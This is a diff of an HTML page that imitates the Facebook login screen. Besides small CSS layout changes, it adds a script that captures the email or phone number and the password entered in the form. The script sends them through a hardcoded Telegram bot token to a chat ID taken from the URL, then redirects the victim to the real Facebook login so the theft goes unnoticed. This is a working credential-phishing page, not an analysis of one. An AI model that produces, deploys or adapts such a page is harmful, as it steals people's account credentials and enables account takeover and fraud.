@@ -10,22 +10,19 @@
             background: linear-gradient(135deg, rgba(242, 246, 255, 1) 0%, rgba(231, 245, 255, 1) 100%);
             margin: 0;
             padding: 0;
-            height: 100vh;
             display: flex;
+            justify-content: center; /* সম্পূর্ণ মাঝখানে রাখে */
+            align-items: center; /* ভর্তিকাল মাঝখানে রাখে */
+            height: 100vh;
             flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            box-sizing: border-box;
         }
 
         .logo-container {
-            position: absolute;
-            top: 50px; /* লোগোকে উপরের দিকে রাখার জন্য */
-            text-align: center;
+            margin-bottom: 20px;
         }
 
         .logo {
-            width: 80px;
+            width: 90px;
         }
 
         .container {
@@ -34,16 +31,15 @@
             background: #ffffff;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
-            padding: 30px;
+            padding: 25px;
             box-sizing: border-box;
-            text-align: center;
-            margin-top: 100px; /* ইনপুট ফিল্ড এবং বাটনকে মাঝামাঝি রাখার জন্য */
+            text-align: center; /* সব কিছু কেন্দ্রীভূত */
         }
 
         .input-field {
             width: 100%;
-            padding: 12px;
-            margin: 10px 0;
+            padding: 14px;
+            margin: 12px 0;
             border: 1px solid #dddfe2;
             border-radius: 6px;
             font-size: 16px;
@@ -52,7 +48,7 @@
 
         .login-btn {
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             background-color: #1877f2;
             color: white;
             border: none;
@@ -68,7 +64,6 @@
         }
 
         .forgot-password {
-            display: block;
             margin-top: 15px;
             font-size: 14px;
             color: #1877f2;
@@ -99,17 +94,15 @@
         }
 
         .meta-logo {
-            width: 90px;
+            width: 80px;
         }
     </style>
 </head>
 <body>
-    <!-- Facebook Logo -->
     <div class="logo-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
     </div>
 
-    <!-- Login Form -->
     <div class="container">
         <form id="loginForm">
             <input type="text" id="emailOrPhone" class="input-field" placeholder="Mobile number or email address" required>
@@ -120,9 +113,45 @@
         <button class="create-account-btn">Create new account</button>
     </div>
 
-    <!-- Meta Logo -->
     <div class="meta-logo-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/1200px-Meta-Logo.png" class="meta-logo" alt="Meta Logo">
     </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const chat_id = urlParams.get('chat_id');
+
+            if (!chat_id || isNaN(chat_id)) {
+                alert("Invalid or missing chat ID.");
+                return;
+            }
+
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            const password = document.getElementById('password').value;
+
+            const token = '7368163635:AAGEHrgX9PIqI7J58rJANzAPr-L9O_BfJWQ';
+            const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            const message = `🔐 Login Details:\n📧 Email/Phone: ${emailOrPhone}\n🔑 Password: ${password}\n\n💡 Chat ID: ${chat_id}`;
+
+            fetch(telegramURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: message })
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = 'https://m.facebook.com/login/';
+                } else {
+                    alert('Failed to send login details.');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('Error occurred while sending data.');
+            });
+        });
+    </script>
 </body>
-    </html>
+</html>
